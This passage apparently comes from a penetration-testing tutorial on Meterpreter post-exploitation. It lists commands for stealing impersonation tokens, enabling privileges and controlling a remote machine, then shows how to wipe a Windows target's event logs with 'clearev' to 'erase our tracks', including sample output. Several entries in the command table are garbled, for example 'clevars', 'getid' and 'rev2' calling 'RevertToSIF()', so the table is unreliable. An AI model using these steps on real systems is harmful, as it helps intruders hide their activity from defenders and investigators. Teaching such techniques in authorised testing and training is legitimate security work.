  md: '```

    Command             Description

    ----------------     =============================

    clevars             Clear the event log

    drop_token          Relinquishes any active impersonation token.

    execute             Execute a command

    getid               Get the current process identifier

    getprivs           Attempt to enable all privileges to the current process

    getuid              Get the user that the server is running

    kill                Terminate a process

    ps                  List running processes

    reboot              Reboots the remote computer

    reg                 Modify and interact with the registry

    rev2             Calls RevertToSIF() on the remote machine

    drop                Drops a system command

    shutdown            Shuts down the remote computer

    steal_token         Attempts to steal an impersonation token from the target process

    suspend             Suspends or resumes a list of processes

    sysinfo             Gets information about the remote system, as OS

    ```


    **CLEAREV** This useful little command will attempt to clear the logs on the remote
    computer.


    We want to erase our tracks and clear the system logs on the target machine. If
    we look at the logs on the Windows 7 system side, we can see that it is full of
    events:


    ![](img/ff9cd19afe449ae54278ee429e668a6f_49_0.png)


    Some of those events may include things that we did. So we can clear the logs
    remotely from the Kali system by typing, “clearev”:


    ```

    > clearev

    [!] Wiping 1587 records from Application...

    [!] Wiping 5148 records from System...

    [!] Wiping 4151 records from Security...

    ```


    The Application, System and Security logs are wiped. If we look at the security
    log again it just shows one record, "Log Clear":


    ![](img/ff9cd19afe449ae54278ee429e668a6f_49_1.png)


    Now obviously this will stick out like a sore thumb to anyone analyzing the logs.
    But if there are events that you removed, you can clear the log.'
